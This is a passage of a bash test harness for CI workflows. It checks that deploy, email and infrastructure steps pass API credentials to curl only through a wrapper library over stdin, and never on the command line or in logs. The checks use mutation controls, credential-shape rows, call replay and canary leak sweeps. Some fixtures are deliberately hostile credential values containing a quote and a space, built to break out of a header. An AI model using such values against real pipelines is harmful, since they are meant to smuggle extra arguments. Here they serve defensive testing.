[[ -z "$(s4_b7_status "$S4_B7_F_NOSECRET")" ]] || S4_B7_FX_BAD+=" nosecret-in-population"
if [[ -z "$S4_B7_FX_BAD" ]]; then row "S4 inline trim population control: the derivation passes a canonical step and reports a step with the guard and the secret but no trim loop, a loop for the wrong names, a removed (no-op) loop, a loop after the definition, and a job-level secret as BAD, and leaves a definer without a secret out of the population" ok
else row "S4 inline trim population control: the derivation is blind to a missing, misplaced or mis-named trim" fail "$S4_B7_FX_BAD"; fi
# MUTANTS of the loop, each built from the REAL step (a line that no longer matches fails its own row, never the battery) and judged by the very predicate above: each must go RED on
# a NAMED scenario and stay green on the ones it still satisfies (a trim that handles only one end, one that strips interior whitespace too, one that follows the runner locale, and
# the loop applied to the HMAC key).
s4_b7_mut() { # <kind> "<scenarios>" "<must be red>" "<must stay green>" [key]
  local kind="$1" scen="$2" red="$3" green="$4" key="${5:-}" wvars='CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET' tok miss="" canon mut
  canon="$(python3 -I -c "$s4_trim_py" canon "$wvars")"
  if [[ -n "$key" ]]; then mut="$(python3 -I -c "$s4_trim_py" canon "$wvars WEBHOOK_SECRET")"; else mut="$(python3 -I -c "$s4_trim_py" "$kind" "$wvars")"; fi
  if s4_body_try "$REPO_ROOT/$S4_WFR" "Deploy via webhook" "$S4/b-ctl-b7-$kind.sh" "$canon" "$mut"; then
    s4_b7_bad "ctl-$kind-wh" "$S4/b-ctl-b7-$kind.sh" wh-post 'Deploy initiated (HTTP 202)' "$scen" "${S4_B7_BASE_DEPLOY[@]}"
    for tok in $red; do [[ "$S4_B7_BAD" == *"$tok"* ]] || miss+=" wh:$tok-not-red"; done
    for tok in $green; do [[ "$S4_B7_BAD" != *"$tok"* ]] || miss+=" wh:$tok-red"; done
  else miss+=" not-built(wh)"; fi
  if [[ -z "$key" ]]; then
    canon="$(python3 -I -c "$s4_trim_py" canon RESEND_API_KEY)"; mut="$(python3 -I -c "$s4_trim_py" "$kind" RESEND_API_KEY)"
    if s4_body_try "$REPO_ROOT/$S4_WFR" "Email notification (deploy FAILED)" "$S4/b-ctl-b7-$kind-rs.sh" "$canon" "$mut"; then
      s4_b7_bad "ctl-$kind-rs" "$S4/b-ctl-b7-$kind-rs.sh" resend-hdr 'Deploy-failure email sent to ops@jikigai.com (HTTP 200)' "$scen" "${S4_B7_BASE_FAILMAIL[@]}"
      for tok in $red; do [[ "$S4_B7_BAD" == *"$tok"* ]] || miss+=" resend:$tok-not-red"; done
      for tok in $green; do [[ "$S4_B7_BAD" != *"$tok"* ]] || miss+=" resend:$tok-red"; done
    else miss+=" not-built(resend)"; fi
  fi
  S4_B7_MISS="$miss"
}
s4_b7_mut_row() { # <description> <kind> ...
  local d="$1"; shift; s4_b7_mut "$@"
  if [[ -z "$S4_B7_MISS" ]]; then row "S4 inline trim control: $d" ok; else row "S4 inline trim control: $d" fail "$S4_B7_MISS"; fi
}
s4_b7_mut_row "removing the trim loop (a no-op loop) is RED on the trim scenario at a CF step and a Resend step" remove "trim" "trim" ""
s4_b7_mut_row "a trailing-only trim is RED on the trim scenario (a leading blank is refused) at both step forms" trail "trim" "trim" ""
s4_b7_mut_row "a leading-only trim is RED on the trim scenario (a trailing newline is refused) at both step forms" lead "trim" "trim" ""
s4_b7_mut_row "a strip-all-whitespace trim is RED on the interior-space scenario (it would send a different credential) and still trims" stripall "trim interior-space" "interior-space" "trim"
s4_b7_mut_row "a locale-class ([[:space:]]) trim is RED on the U+2003 scenario under a UTF-8 locale and still trims ASCII" locale "trim u2003" "u2003" "trim"
s4_b7_mut_row "applying the loop to the HMAC key as well is RED on the key scenario (the key must sign exactly as given)" key "key" "key-not-trimmed" "" key

# ---- rows 16 and 17: apply-deploy-pipeline-fix. Row 16 "Redeploy to load applied profile" (library; the baseline read, the settle re-read, the POST and the poll
# share one credential set) and row 17 "Verify journald_storage" (three attempts). Both read their credentials through doppler (stubbed by secret NAME). ----
S4_CWD="$REPO_ROOT/apps/web-platform/infra"
s4_body "$REPO_ROOT/$S4_DPF" "Redeploy to load applied profile" "$S4/b-r16.sh"
s4_body "$REPO_ROOT/$S4_DPF" "Verify journald_storage" "$S4/b-r17.sh"
S4_SECCOMP_SHA="$(sha256sum "$REPO_ROOT/apps/web-platform/infra/seccomp-bwrap.json" | cut -d' ' -f1)"
s4_seccomp_frame() { # <loaded_matches> <start_ts> [extra json members]
  printf '{"seccomp_profile_host_present":true,"seccomp_profile_host_sha256":"%s","seccomp_profile_loaded_matches_host":%s,"tag":"v1.2.3","component":"web-platform","reason":"ok","exit_code":0,"start_ts":%s%s}' "$S4_SECCOMP_SHA" "$1" "$2" "${3:-}"; }
# the fast path: the container already enforces the committed profile, so the step makes ONE signed read and ends 0
S4_BASE=("${S4_DOP_BASE[@]}" "SHIM_STATUS_BODY=$(s4_seccomp_frame true 1700000123)")
s4_run r16-fast "$S4/b-r16.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'already enforcing the committed profile'; then
  row "S4 row 16 redeploy (fast path): a well-formed baseline read carries the digest over the empty body and the pair on stdin and finds the profile already enforced" ok
else row "S4 row 16 redeploy (fast path): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
# the full path: stale baseline, settle re-read, /health, the signed POST, one poll that sees OUR terminal frame, the final state check
S4_BASE=("${S4_DOP_BASE[@]}" "SHIM_STATUS_BODY=$(s4_seccomp_frame false 1700000123)" "SHIM_STATUS_BODY_POST=$(s4_seccomp_frame true 1700000200 ',"sandbox_canary":{"verdict":"pass"}')" 'SHIM_HEALTH_BODY={"version":"1.2.3"}')
s4_run r16-full "$S4/b-r16.sh" "$S4/real" "${S4_BASE[@]}"
S4_R16_OK=1; for ci in 1 2 5; do s4_wh_ok "$S4/bodies/empty" "$ci" || S4_R16_OK=0; done; s4_wh_ok "$S4_ROW/calls/4.body" 4 || S4_R16_OK=0
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 5 && "$S4_R16_OK" == 1 && "$(s4_markers)" == 0 ]] && grep -qF 'deploy web-platform ghcr.io/jikig-ai/soleur-web-platform v1.2.3' "$S4_ROW/calls/4.body" \
   && s4_said 'Redeploy initiated (HTTP 202)' && s4_said 'STATE invariant holds'; then
  row "S4 row 16 redeploy (full path): the stale baseline, the settle re-read, the signed POST (independent digest over the recorded payload) and the poll make 4 signed requests, each with the pair on stdin and nothing on any argv, and the committed profile is confirmed live" ok
else row "S4 row 16 redeploy (full path): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) signed-ok=$S4_R16_OK markers=$(s4_markers)"; fi
s4_v_r16() { [[ "$S4_RC" != 0 ]] || return 1
  case "$2" in
    unset) ! s4_said 'Redeploy initiated' ;;   # a doppler read aborts the step before any guard: the old behaviour, no request
    *) s4_said '::error::Cannot read /hooks/deploy-status (HTTP 000)' && ! s4_said 'Redeploy webhook rejected' && ! s4_said 'Redeploy initiated' && [[ "$(s4_markers)" == 1 ]] ;;
  esac; }
S4_BASE=("${S4_DOP_BASE[@]}" "SHIM_STATUS_BODY=$(s4_seccomp_frame false 1700000123)" "SHIM_STATUS_BODY_POST=$(s4_seccomp_frame true 1700000200)" 'SHIM_HEALTH_BODY={"version":"1.2.3"}')
s4_sweep r16 "$S4/b-r16.sh" "$S4/real" s4_v_r16 "D_CF_ACCESS_CLIENT_ID D_CF_ACCESS_CLIENT_SECRET" "D_WEBHOOK_DEPLOY_SECRET"
s4_sweep_row "S4 row 16 redeploy: an empty or hostile credential is the baseline read's old red ('Cannot read /hooks/deploy-status (HTTP 000) — refusing to assert loaded profile blind', exit 1) with ONE marker and zero requests, never 'Redeploy webhook rejected' (an unset one aborts at the doppler read as before)"
s4_v_r16_nopy() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 1 ]] && s4_said 'Cannot read /hooks/deploy-status (HTTP 000)' && ! s4_said 'Redeploy initiated'; }
s4_nopy_row "S4 row 16 redeploy (library HMAC site): python3 absent is the same baseline-read red with the marker and zero requests, never a redeploy" "$S4/b-r16.sh" s4_v_r16_nopy
s4_mutant_red "S4 row 16 redeploy control: a refused baseline read swallowed into HTTP 200 (|| echo \"200\" instead of || echo \"000\") is judged RED (the step would go on to assert a loaded profile it never read)" "$REPO_ROOT/$S4_DPF" "Redeploy to load applied profile" r16-swallow200 '"$STATUS_URL" || echo "000"' '"$STATUS_URL" || echo "200"' s4_v_r16 "D_CF_ACCESS_CLIENT_ID=${S4_CANARY}\"x"
S4_BASE=("${S4_DOP_BASE[@]}" 'SHIM_STATUS_BODY={"journald_storage":{"persistent":true}}')
s4_run r17-ok "$S4/b-r17.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'journald_storage.persistent == true (attempt 1)'; then
  row "S4 row 17 journald_storage probe: a well-formed run reads the field through the digest over the empty body and the pair on stdin, and passes on the first attempt" ok
else row "S4 row 17 journald_storage probe: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r17() { [[ "$S4_RC" != 0 ]] || return 1
  case "$2" in
    unset) ! s4_said 'persistent == true' ;;
    *) [[ "$(s4_markers)" == 3 ]] && s4_said "::error::/hooks/deploy-status .journald_storage.persistent is '', expected 'true'" && ! s4_said 'persistent == true' ;;
  esac; }
s4_sweep r17 "$S4/b-r17.sh" "$S4/real" s4_v_r17 "D_CF_ACCESS_CLIENT_ID D_CF_ACCESS_CLIENT_SECRET" "D_WEBHOOK_DEPLOY_SECRET"
s4_sweep_row "S4 row 17 journald_storage probe: an empty or hostile credential is the step's old terminal red (three attempts, then the ::error:: naming an empty field) with ONE marker per attempt and zero requests (an unset one aborts at the doppler read as before)"
s4_v_r17_nopy() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 3 ]] && ! s4_said 'persistent == true'; }
s4_nopy_row "S4 row 17 journald_storage probe (library HMAC site): python3 absent reaches the same terminal red with the marker per attempt" "$S4/b-r17.sh" s4_v_r17_nopy
s4_mutant_red "S4 row 17 journald_storage probe control: a refused read swallowed into HTTP 200 (|| echo \"200\" instead of || echo \"000\") is judged RED (the probe would read a field out of a response nobody received)" "$REPO_ROOT/$S4_DPF" "Verify journald_storage" r17-swallow200 '/hooks/deploy-status" || echo "000")' '/hooks/deploy-status" || echo "200")' s4_v_r17 "D_CF_ACCESS_CLIENT_ID=${S4_CANARY}\"x"
S4_CWD=""

# ---- the realistic credential shapes MUST PASS (the guard's alphabet is judged against what the vendors actually issue) ----
S4_JWT="$(printf '{"alg":"RS256","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').$(printf '{"iss":"123456","iat":1700000000,"exp":1700000600}' | base64 -w0 | tr '+/' '-_' | tr -d '=').$(head -c 48 /dev/urandom | base64 -w0 | tr '+/' '-_' | tr -d '=')"
printf '%s\n' 'source "${GITHUB_WORKSPACE:?}/scripts/lib/bearer-curl.sh" || exit 1' \
  'bc_curl s4-shapes "Authorization:Bearer :TOK" -- -sS --max-time 5 https://example.invalid/x' > "$S4/shape-lib.sh"
printf '%s\n' "$BEARER_FN" '_bearer_ok "${TOK:-}" || exit 1' "( LC_ALL=C; case \"\${TOK:-}\" in ${S4_PAT}) exit 1 ;; esac ) || exit 1" > "$S4/shape-inline.sh"
S4_SHAPE_BAD=""
for shape in "sig64:$S4_HEX64" "cfid:$S4_CFID" "sbp:$S4_SBP" "jwt:$S4_JWT" "ghs:$S4_GHS" "hetzner:$S4_HZ" "resend:$S4_RESEND"; do
  sname="${shape%%:*}"; sval="${shape#*:}"
  s4_run "shape-$sname" "$S4/shape-lib.sh" "$S4/real" TOK="$sval"
  { [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $sval\"" ]] && s4_calls_ok 1 && ! s4_argv_has "$sval"; } || S4_SHAPE_BAD+=" $sname(library rc=$S4_RC)"
  s4_run "shape-$sname-inline" "$S4/shape-inline.sh" "$S4/real" TOK="$sval"
  [[ "$S4_RC" == 0 ]] || S4_SHAPE_BAD+=" $sname(inline rc=$S4_RC)"
done
[[ -z "$S4_SHAPE_BAD" ]] && row "S4 must-PASS shapes: a 64-hex signature, a <hex>.access Cloudflare id, a Supabase sbp_ token, a JWT with dots, a ghs_ installation token, a Hetzner token and a Resend re_ key are ALL accepted by the library (and arrive on stdin only), by the inline _bearer_ok and by infra-config-verify's case pattern" ok || row "S4 must-PASS shapes: a realistic credential is refused" fail "$S4_SHAPE_BAD"

# ---- the replay (binding lesson 3): every converted call's non-credential argument list passes the library's own `_bc_tail_ok` ----
# STATIC: each `bc_curl` statement of the nine library-user files is evaluated with `bc_curl` overridden to hand its argument list (after `--`) to the real
# `_bc_tail_ok` (a statement that does not parse, or a refusal, is a failure). DYNAMIC: every call the well-formed runs above recorded (the real bodies:
# the SQL payload, the Resend HTML, the push payload path) is replayed the same way.
s4_replay_py='
import sys, yaml, re, os
out = sys.argv[1]; n = 0
for f in sys.argv[2:]:
    if f.endswith((".yml", ".yaml")):
        d = yaml.safe_load(open(f)); steps = []
        if isinstance(d.get("runs"), dict): steps = d["runs"].get("steps") or []
        else:
            for j in (d.get("jobs") or {}).values(): steps += (j.get("steps") or []) if isinstance(j, dict) else []
        texts = [s["run"] for s in steps if isinstance(s, dict) and isinstance(s.get("run"), str)]
    else:
        texts = [open(f).read()]
    for t in texts:
        lines = t.split("\n"); i = 0
        while i < len(lines):
            l = lines[i]
            if re.search(r"(^|[^_A-Za-z])bc_curl [A-Za-z]", l) and not l.lstrip().startswith("#"):
                j = i; buf = l
                while buf.endswith("\\") and j + 1 < len(lines):
                    j += 1; buf = buf[:-1] + " " + lines[j].strip()
                n += 1
                # the failure handler of a trigger opens a brace block on the last line of the call (the text after the closing paren); the call itself ends before it
                buf = re.sub(r"\s*\|\| \{ rc=\$\?\s*$", "", buf)
                open(os.path.join(out, "%03d.stm" % n), "w").write(buf.strip() + "\n"); i = j
            i += 1
print(n)
'
S4_RP="$S4/replay"; assert_fixture_dir "$S4_RP"; mkdir -p "$S4_RP"
S4_REPLAY_FILES=".github/actions/dispatch-web-redeploy/track.sh .github/actions/mint-infra-app-token/action.yml .github/workflows/apply-deploy-pipeline-fix.yml .github/workflows/apply-github-infra.yml .github/workflows/apply-inngest-rls.yml .github/workflows/restart-inngest-server.yml .github/workflows/scheduled-inngest-health.yml apps/web-platform/infra/push-infra-config.sh apps/web-platform/scripts/github-app-key-status.sh"
S4_RP_N="$(cd "$REPO_ROOT" && python3 -I -c "$s4_replay_py" "$S4_RP" $S4_REPLAY_FILES)"
S4_RP_OK=0; S4_RP_BAD=""
for stm in "$S4_RP"/*.stm; do
  [[ -e "$stm" ]] || continue
  { printf 'source "%s/scripts/lib/bearer-curl.sh"\n' "$REPO_ROOT"
    printf '%s\n' 'bc_curl() { shift; while [[ $# -gt 0 && "$1" != -- ]]; do shift; done; shift; if _bc_tail_ok "$@" 2>/dev/null; then echo OK >&2; else echo REFUSED >&2; fi; }'
    cat "$stm"; } > "$stm.sh"
  ( cd "$S4_RP" && env -i PATH="$S4/real" "$BASH_BIN" --noprofile --norc "$stm.sh" > /dev/null 2> "$stm.out" < /dev/null )
  res="$(grep -cx OK "$stm.out" || true)"; [[ "$(grep -c REFUSED "$stm.out" || true)" == 0 ]] || res=0
  [[ "$res" -ge 1 ]] && S4_RP_OK=$((S4_RP_OK + 1)) || S4_RP_BAD+=" $(basename "$stm")"
done
# BOTH operands are literals on the lines IMMEDIATELY above the `if`: 24 bc_curl statements in the nine files.
S4_REPLAY_FLOOR=24
if [[ -z "$S4_RP_BAD" && "$S4_RP_OK" == "$S4_RP_N" && "$S4_RP_OK" -ge "$S4_REPLAY_FLOOR" ]]; then row "S4 replay (static): all $S4_RP_OK converted bc_curl statements hand an argument list the library's own _bc_tail_ok accepts (zero refusals; anti-vacuity floor $S4_REPLAY_FLOOR)" ok
else row "S4 replay (static): a converted call's argument list is refused or does not parse" fail "ok=$S4_RP_OK of $S4_RP_N bad:$S4_RP_BAD"; fi
s4_tail_probe() { # <argv file>: the recorded call minus the library's own prefix and the config channel, judged by _bc_tail_ok
  local -a av tail_=(); local i
  mapfile -d '' av < "$1"
  for ((i = 0; i < ${#av[@]}; i++)); do
    if [[ "${av[i]}" == --config && "${av[i+1]:-}" == - ]]; then i=$((i + 1)); continue; fi
    tail_+=("${av[i]}")
  done
  tail_=("${tail_[@]:3}")
  env -i PATH="$S4/real" "$BASH_BIN" --noprofile --norc -c 'source "$1/scripts/lib/bearer-curl.sh"; shift; _bc_tail_ok "$@"' _ "$REPO_ROOT" "${tail_[@]}" > /dev/null 2>&1
}
S4_DYN_N=0; S4_DYN_BAD=""
for rd in "$S4"/rows/*; do
  case "$(basename "$rd")" in *empty*|*unset*|*hostile*|*nopy*|*transport*|*nolib*|*visible*|*shape*|*ctl*) continue ;; esac
  for af in "$rd"/calls/*.argv; do
    [[ -e "$af" ]] || continue
    S4_DYN_N=$((S4_DYN_N + 1)); s4_tail_probe "$af" || S4_DYN_BAD+=" $(basename "$rd")/$(basename "$af")"
  done
done
# the dynamic replay also needs a floor and a control: a body that reads stdin MUST be refused by the very probe
printf '%s\0' --disable --noproxy '*' -sS --data-binary @- https://example.invalid/x --config - > "$S4/ctl-replay.argv"
S4_DYN_FLOOR=61
if [[ -z "$S4_DYN_BAD" && "$S4_DYN_N" -ge "$S4_DYN_FLOOR" ]] && ! s4_tail_probe "$S4/ctl-replay.argv"; then
  row "S4 replay (dynamic): all $S4_DYN_N calls the well-formed runs recorded (real SQL, Resend, payload-path and header arguments) pass _bc_tail_ok, and the probe refuses a body read from stdin (control); anti-vacuity floor $S4_DYN_FLOOR" ok
else row "S4 replay (dynamic): a recorded call is refused, the population is below its floor, or the probe is blind" fail "n=$S4_DYN_N bad:$S4_DYN_BAD"; fi
# The extracted steps' environment is the YAML's own (review F1). s4_run injects a NAME=value into a step extracted from a workflow only when the workflow-level env,
# the job-level env, the step's env or an earlier `echo NAME=... >> $GITHUB_ENV` DECLARES NAME, so deleting a credential's `env:` declaration from a converted step makes
# its well-formed row RED. CONTROL: the restart trigger run with a declaration list that lacks CF_ACCESS_CLIENT_ID sees the id UNSET (zero requests, refused, logged as dropped).
grep -vxF CF_ACCESS_CLIENT_ID "$S4/b-r1.sh.decl" > "$S4/b-r1x.sh.decl"; cp "$S4/b-r1.sh" "$S4/b-r1x.sh"
S4_DECL_N="$(grep -c . "$S4/b-r1.sh.decl")"; S4_DECL_NX="$(grep -c . "$S4/b-r1x.sh.decl")"
s4_run ctl-r1-undeclared "$S4/b-r1x.sh" "$S4/real" "${S4_WH_BASE[@]}"
if [[ "$S4_DECL_N" == "$((S4_DECL_NX + 1))" && "$S4_RC" != 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 1 ]] && grep -qxF 'ctl-r1-undeclared CF_ACCESS_CLIENT_ID' "$S4/dropped.log"; then
  row "S4 step env control: a step whose YAML does not declare a credential sees it UNSET (the harness injects only declared names): the restart trigger without CF_ACCESS_CLIENT_ID makes zero requests, refuses with the marker and the drop is logged" ok
else row "S4 step env control: an undeclared credential is still injected" fail "rc=$S4_RC calls=$(s4_ncalls) decl=$S4_DECL_N/$S4_DECL_NX"; fi
# SCOPE of the derivation (the control above proves the FILTER drops, not that the derivation is scoped to ONE step): a fixture workflow whose step A is judged against a decl that
# holds the workflow env, ITS job's env and its own env, and not a sibling step's env nor another job's env. Two MUTANT derivations (union of every step's env in the job; union of
# every job's env) must be judged red by the same predicate, so over-broad derivation (which would let a row inject a name its own step never declares) cannot pass silently.
S4_DF="$S4/declfix"; assert_fixture_dir "$S4_DF"; mkdir -p "$S4_DF"
printf '%s\n' 'name: x' 'env:' '  WF_LEVEL: a' 'jobs:' '  j1:' '    env:' '      JOB_LEVEL: b' '    steps:' '      - name: step A' '        env:' '          ONLY_A: "1"' \
  '        run: |' '          echo a' '      - name: step B' '        env:' '          ONLY_B: "2"' '        run: |' '          echo b' \
  '  j2:' '    env:' '      OTHER_JOB: c' '    steps:' '      - name: step C' '        run: |' '          echo c' > "$S4_DF/w.yml"
s4_decl_with() { python3 -I -c "$1" "$S4_DF/w.yml" "step A"; }
s4_decl_scope_bad() { # <decl text>: names the scope clauses the derivation breaks
  local d="$1" b="" n
  for n in WF_LEVEL JOB_LEVEL ONLY_A; do grep -qxF "$n" <<<"$d" || b+=" missing-$n"; done
  for n in ONLY_B OTHER_JOB; do ! grep -qxF "$n" <<<"$d" || b+=" leaked-$n"; done
  printf '%s' "$b"
}
S4_DM_STEP="${s4_decl_py/add(s.get(\"env\"))/for o in steps: add(o.get(\"env\"))}"
S4_DM_JOB="${s4_decl_py/if job: add(job.get(\"env\"))/for jj in d[\"jobs\"].values(): add(jj.get(\"env\"))}"
S4_DS_REAL="$(s4_decl_scope_bad "$(s4_decl_with "$s4_decl_py")")"
S4_DS_STEP="$(s4_decl_scope_bad "$(s4_decl_with "$S4_DM_STEP")")"; S4_DS_JOB="$(s4_decl_scope_bad "$(s4_decl_with "$S4_DM_JOB")")"
if [[ -z "$S4_DS_REAL" && "$S4_DM_STEP" != "$s4_decl_py" && "$S4_DM_JOB" != "$s4_decl_py" && "$S4_DS_STEP" == *leaked-ONLY_B* && "$S4_DS_JOB" == *leaked-OTHER_JOB* ]]; then
  row "S4 step env scope control: the derivation gives a step the workflow env, its own job's env and its own env only; a union of the job's step envs and a union of every job's env are each judged RED (a sibling step's or another job's name leaks)" ok
else row "S4 step env scope control: the derivation is not scoped to one step, or a mutated derivation is not judged red" fail "real='$S4_DS_REAL' stepunion='$S4_DS_STEP' jobunion='$S4_DS_JOB' landed=$([[ "$S4_DM_STEP" != "$s4_decl_py" && "$S4_DM_JOB" != "$s4_decl_py" ]] && echo yes || echo NO)"; fi
# The population of drops: no real row had a NAME dropped, i.e. every name this stage injects into an extracted step is declared by it. Only the ONE control above that
# deliberately removes a declaration is exempt (a blanket `ctl-` exemption would let a control with a typo'd name be dropped and pass for the wrong reason). The claim covers the
# runs of steps extracted from a workflow (those with a .decl); the script rows are not under this regime.
# BOTH operands are literals on the lines IMMEDIATELY above the `if`: 0 drops across the 358 run directories of the stage (the realized count).
S4_DROP_N="$(grep -vc '^ctl-r1-undeclared ' "$S4/dropped.log" || true)"
S4_STEPRUNS="$(find "$S4/rows" -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d ' ')"
S4_DROP_WANT=0
S4_STEPRUN_FLOOR=358
if [[ "$S4_DROP_N" == "$S4_DROP_WANT" && "$S4_STEPRUNS" -ge "$S4_STEPRUN_FLOOR" ]]; then row "S4 step env: every variable the stage injects into a step extracted from a workflow is declared by that step, its job or its workflow (0 of $S4_STEPRUNS runs had a name dropped; floor $S4_STEPRUN_FLOOR runs)" ok
else row "S4 step env: the harness injected a variable its step does not declare, or the run population is below its floor" fail "dropped='$(grep -v '^ctl-r1-undeclared ' "$S4/dropped.log" | sort -u | tr '\n' ' ')' runs=$S4_STEPRUNS floor=$S4_STEPRUN_FLOOR"; fi
# The negative canary, as one population: the planted canary was searched for in EVERY captured stream (stdout, stderr, GITHUB_OUTPUT, GITHUB_ENV, the step
# summary, every recorded argv and stdin and every file a step wrote) of every hostile or refused run above; a run that leaks fails its own row, and this row
# proves the sweep was not vacuous. BOTH operands are literals on the lines IMMEDIATELY above the `if`.
S4_CANARY_FLOOR=257
if [[ "$S4_REFUSAL_RUNS" -ge "$S4_CANARY_FLOOR" ]]; then row "S4 negative canary: $S4_REFUSAL_RUNS refusal runs searched for the planted canary in every captured stream (anti-vacuity floor $S4_CANARY_FLOOR)" ok
else row "S4 negative canary: the refusal population is below its anti-vacuity floor" fail "runs=$S4_REFUSAL_RUNS floor=$S4_CANARY_FLOOR"; fi
echo "=== stage S4: Guard 2 rows 13 to 24, shapes and replay done ==="

# =====================================================================================
# STAGE S5 (argv-bearer sweep S5, ADR-280): the last slice. `apply-web-platform-infra.yml` (five sites: three best-effort Better Stack
# heartbeat-status reads and the two Hetzner existence probes of the recovery-posture step) and, in the registry commit, the four
# Better Stack posting scripts of `cloud-init-registry.yml`, leave the process command line. Baseline E then held only the two cla-evidence
# rows owned by #9756; that issue converted them and baseline E is empty, so the set rows below derive the registry row only while it
# still offends and every row of the file needs an owner line. Population and the manifests are DERIVED from the tree; the real step bodies
# are EXECUTED under the S4 recording curl.
#
#   GUARD 1  no curl of either converted file carries a credential header on its own argument list, and the baseline and the ceiling
#            table hold exactly the rows still owned by tracked work (set identity, not a count); every library call of the apply
#            workflow sits after its `source` line inside its own step (an ORDER row, which the lint cannot decide statically).
#   GUARD 2  a refused credential reaches the SAME verdict class as the failure it replaces: the heartbeat reads stay non-gating
#            ("unavailable", exit 0), the gating volume-existence probe reads `unknown-*` and can never read `absent`.
# All credentials are synthesized. A fixture credential is built from pieces, never a contiguous token literal.
# =====================================================================================
S5_WF=".github/workflows/apply-web-platform-infra.yml"
S5_REG="apps/web-platform/infra/cloud-init-registry.yml"
S5_CANARY="S5CANARYsecret0123"
S5_HZ="$(od -An -N32 -tx1 /dev/urandom | tr -d ' \n')"                   # the shape of a Hetzner Cloud token: 64 alphanumerics
S5_BS="synth_s5-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')-tok_en"   # a Better Stack token with `_` and `-`
S5_BAD="${S5_CANARY}\" x"                                                  # a quote and a space: outside the alphabet, so refused
S5_HB_JSON='{"data":[{"attributes":{"name":"some-other-heartbeat","status":"down"}},{"attributes":{"name":"soleur-registry-disk-prd","status":"up"}}]}'
S5_REFUSALS=0; S5_CANARY_RUNS=0
# A run counts toward the negative-canary floors only when the planted canary is in its arguments (a run that plants none searches for nothing).
s5_run() { [[ "$*" == *"$S5_CANARY"* ]] && S5_CANARY_RUNS=$((S5_CANARY_RUNS + 1)); s4_run "$@"; }
s5_canary_clean() { ! grep -qaF -- "$S5_CANARY" < <(grep -rahv '^::add-mask::' "$S4_ROW" 2>/dev/null); }
# The step body of ONE job (a step name is not unique across the dispatch-only jobs): a copy of the workflow holding only that job.
s5_job_body() { # <job> <step name prefix> <out> [<from> <to>]...
  local job="$1" sel="$2" out="$3"; shift 3
  assert_fixture_dir "$out"
  python3 -I -c 'import sys, yaml
d = yaml.safe_load(open(sys.argv[1]))
yaml.safe_dump({"env": d.get("env"), "jobs": {sys.argv[2]: d["jobs"][sys.argv[2]]}}, open(sys.argv[3], "w"))' "$REPO_ROOT/$S5_WF" "$job" "$out.yml" \
    || fatal "S5 could not isolate the job '$job' of $S5_WF"
  s4_body "$out.yml" "$sel" "$out" "$@"
}
S5_B_HB1="$S4/b-s5-hb1.sh"; S5_B_HB2="$S4/b-s5-hb2.sh"; S5_B_HB3="$S4/b-s5-hb3.sh"; S5_B_PST="$S4/b-s5-pst.sh"; S5_B_EMP="$S4/b-s5-emp.sh"
s5_job_body registry_host_replace "Best-effort heartbeat status" "$S5_B_HB1"
s5_job_body registry_region_migrate "Best-effort heartbeat status" "$S5_B_HB2"
s5_job_body registry_luks_recut "Best-effort registry disk heartbeat status" "$S5_B_HB3"
s5_job_body registry_pull_path_gate "Resolve recovery posture" "$S5_B_PST"
s5_job_body git_data_host_replace "Rotate precondition — served store measured empty" "$S5_B_EMP"

# ---- Guard 1: the apply workflow ----
S5_LINT_OUT="$(python3 scripts/lint-shell-trace-credential-refusal.py "$S5_WF" 2>&1)"; S5_LINT_RC=$?
if [[ "$S5_LINT_RC" == 0 && "$S5_LINT_OUT" == OK:* ]]; then row "S5 Guard 1: Rule E on the explicit path of the apply workflow reports no curl with a credential header of its own (the explicit path bypasses the baseline)" ok
else row "S5 Guard 1: the apply workflow still has curl commands that carry a credential header" fail "rc=$S5_LINT_RC $(tail -1 <<<"$S5_LINT_OUT")"; fi
# The ORDER rule the lint cannot decide: in every step that calls the library, the `source` line comes BEFORE the first call.
s5_order_ok() { # <body file> -> rc 0 when a `source ...bearer-curl.sh` line precedes the first bc_curl statement and both exist (comment lines do not count)
  local t src call
  t="$(grep -vn '^[[:space:]]*#' "$1" || true)"
  src="$(grep -m1 'source .*scripts/lib/bearer-curl\.sh' <<<"$t" | cut -d: -f1)"
  call="$(grep -m1 'bc_curl [a-z]' <<<"$t" | cut -d: -f1)"
  [[ -n "$src" && -n "$call" && "$src" -lt "$call" ]]
}
S5_ORDER_BAD=""; S5_BCN=0
for b in "$S5_B_HB1" "$S5_B_HB2" "$S5_B_HB3" "$S5_B_PST" "$S5_B_EMP"; do
  s5_order_ok "$b" || S5_ORDER_BAD+=" ${b##*/}"
  S5_BCN=$((S5_BCN + $(grep -v '^[[:space:]]*#' "$b" | grep -c 'bc_curl [a-z-]* ' || true)))
done
# The derived population: every step of the workflow that calls the library is one of the five bodies built above (a sixth call site that
# nothing here judges is a defect); BOTH operands of the floor are literals on the lines IMMEDIATELY above the `if`.
S5_STEPS_WITH_BC="$(python3 -I -c 'import sys, yaml
d = yaml.safe_load(open(sys.argv[1]))
n = 0
for j in d["jobs"].values():
    for s in (j.get("steps") or []):
        if isinstance(s.get("run"), str) and "bc_curl " in s["run"]: n += 1
print(n)' "$REPO_ROOT/$S5_WF")"
S5_BC_FLOOR=6
S5_STEPS_WANT=5
